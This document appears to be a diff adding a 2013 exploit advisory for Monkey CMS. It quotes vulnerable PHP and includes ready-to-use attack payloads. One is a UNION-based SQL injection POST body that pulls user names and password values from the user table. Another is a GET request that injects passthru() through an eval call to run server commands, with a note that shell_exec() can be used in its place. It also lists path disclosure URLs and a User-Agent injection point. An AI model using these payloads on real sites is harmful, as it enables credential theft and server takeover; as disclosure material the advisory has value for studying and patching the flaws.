@@ -1,0 +1,105 @@
+###########################################################################################
+# Exploit Title: Monkey CMS - Multiple Vulnerabilities
+# Date: 2013 17 June
+# Exploit Author: Yashar shahinzadeh & Mormoroth
+# Vendor Homepage: http://www.monkeycms.com/
+# Tested on: Linux & Windows, PHP 5.3.10
+# Affected Version : All versions
+# Contacts: { http://Twitter.com/YShahinzadeh , http://Twitter.com/Mormoroth }
+###########################################################################################
+
+Summary:
+========
+1. Local path disclosure
+2. MySQL Injection (Error based)
+3. MySQL Injection (Time based blind)
+4. Remote command execution
+5. More
+ 
+
+1. Local path disclosure:
+=========================
+http://site.com/[Path of Monkey CMS]/admincp/phpinfo.php
+http://site.com/[Path of Monkey CMS]/admincp/classes/database.php
+
+2. MySQL Injection (Error based):
+=================================
+Vulnerable lines of advancedsearch.php (Lines from 23 through 50):
+
+...
+...
+case 'advancedsearch.php':
+      $action = $_GET['action'];
+      $asstart = $_GET['asstart'];
+      $contentelement = $_GET['contentelement'];
+      $definitionid = $_GET['definitionid'];
+      $direction = $_GET['direction'];
+      $enddate = $_GET['enddate'];
+      $orderby = $_GET['orderby'];
+      $perpage = $_GET['perpage'];
+      $searchid = $_GET['searchid'];
+      $searchterm = $_GET['searchterm'];
+      $startdate = $_GET['startdate'];
+      $typeid = $_GET['typeid'];
+break;
+...
+...
+
+Vulnerable lines of advancedsearch2.php (Lines from 23 through 50):
+
+...
+...
+case 'advancedsearch2.php':
+      $action = $_POST['action'];
+      $asstart = $_POST['asstart'];
+      $contentelement = $_POST['contentelement'];
+      $definitionid = $_POST['definitionid'];
+      $direction = $_POST['direction'];
+      $enddate = $_POST['enddate'];
+      $orderby = $_POST['orderby'];
+      $perpage = $_POST['perpage'];
+      $searchterm = $_POST['searchterm'];
+      $startdate = $_POST['startdate'];
+      $typeid = $_POST['typeid'];
+break;
+...
+...
+
+
+Exploit (POST request to pages above):
+
+action=search&asstart=0&contentelement=1&definitionid=1 UNION ALL SELECT NULL,CONCAT(0x3a6c70653a,password,0x766763616b68,user_name,0x3a626e743a),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM monkey.mcms_user
+
+
+3. MySQL Injection (Time based blind):
+======================================
+Vulnerable lines of global.php (Lines 456,526): 
+
+...
+...
+"insert into guests (ip_address, datetime, user_agent, is_bot, last_page) values ('$ip', '".date("Y-m-d H:i:s")."', '".$_SERVER['HTTP_USER_AGENT']."', '".$ib."', '".selfURL()."')";
+...
+...
+
+
+Exploit (POST request to pages "index.php","login.php",ETC): Attack is capable of injecting by USER_AGENT
+
+4. Remote command execution:
+============================
+Vulnerable lines of functions.php (Lines 2272,2273): 
+
+...
+...
+$strCommand = "\$p = \$arrayFunctions[$function[0]"."_parameters];";
+eval($strCommand);
+...
+...
+
+Exploit (GET request):
+http://site.com/[Path of Monkey CMS]/index.php?page=TagIndex&tags=${passthru('dir')}
+
+Note that nny function which can issue server side command can be used instead of passthru(), i.e. shell_exec()
+
+5. More
+============================
+There were also some unimportant vulnerabilities we haven't mentioned.
